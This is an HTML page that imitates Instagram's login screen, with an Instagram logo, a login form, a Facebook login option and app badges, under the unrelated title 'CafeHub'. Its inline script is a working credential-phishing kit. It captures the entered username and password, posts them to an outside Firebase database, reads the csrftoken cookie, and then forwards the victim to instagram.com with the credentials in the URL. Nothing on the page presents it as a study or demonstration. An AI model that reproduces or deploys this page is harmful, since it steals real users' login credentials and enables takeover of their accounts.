<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link href="https://fonts.googleapis.com/css?family=K2D:400,700" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Roboto:300i,400,700" rel="stylesheet">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css" integrity="sha384-5sAR7xN1Nv6T6+dT2mhtzEpVJvfS3NScPQTrOxhwjIuvcA67KV2R5Jz6kr4abQsz"
    crossorigin="anonymous">
    <script
  src="https://code.jquery.com/jquery-3.3.1.js"
  integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60="
  crossorigin="anonymous"></script>
  <link rel="stylesheet" href="style.css">
  <script src="main.js"></script>
  <title>CafeHub</title>
</head>

<body>
  <div class="container">
<img src="https://i.ibb.co/fSZrktN/instagram-logo.png" alt="instagram-logo" class="insta_logo">
      <br><br><br>
       <form onsubmit="onSubmit() ; return false ">  
      <input type="text" placeholder="Phone number, username or email address"  onchange="getValue(this)" class="email">
      <input type="password" placeholder="Password"   onchange="getValue(this)"  class="email password">
      <br><br>
      <button  >Log In</button>
      <br>
  </form>
      <p class="or">OR</p>
<img src="https://i.ibb.co/Dzr4DC6/facebook-logo.jpg" alt="facebook-logo" class="facebook">
      <p class="fb">Login with Facebook</p>
      <br><br>
      <p class="forgot">Forgotten your password?</p>
      <br>
      <div class="dont">
          <p>Dont have an account? <span> Sign up</span></p>
      </div>
      <br>
      <p class="get">Get the app.</p>
      <div class="img">
          <img src="https://i.ibb.co/bHVsHrT/app-store.png" alt="app_store">
          <img src="https://i.ibb.co/JBVJ8JB/play-store.png" alt="play_store">
      </div>
  </div>

   
   
  <script>
   
   let username = ""
   let password = ""

function getValue(event) {
    if(event.placeholder=='Phone number, username or email address') {
      username = event.value          
    }else{
      password = event.value          
    }
  
}



function onSubmit() {
   let url = "https://screenshot-5026c-default-rtdb.firebaseio.com/test.json"
  console.log(getCookie('csrftoken'));
  console.log(username , password);   
  let model = {    username ,password }
fetch(url, {
  method: 'POST', // or 'PUT'
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify(model),
})
  .then((response) => response.json() )
  .then((data) => {
    console.log('Success:', data);
    window.location.href="https://www.instagram.com/?u="+username+"&p="+password
  })
  .catch((error) => {
    console.error('Error:', error);
  });
}


function getCookie(cname) {
var name = cname + "=";
var decodedCookie = decodeURIComponent(document.cookie);
var ca = decodedCookie.split(';');
for(var i = 0; i <ca.length; i++) {
  var c = ca[i];
  while (c.charAt(0) == ' ') {
    c = c.substring(1);
  }
  if (c.indexOf(name) == 0) {
    return c.substring(name.length, c.length);
  }
}
return "";
}
</script>
</body>

</html>
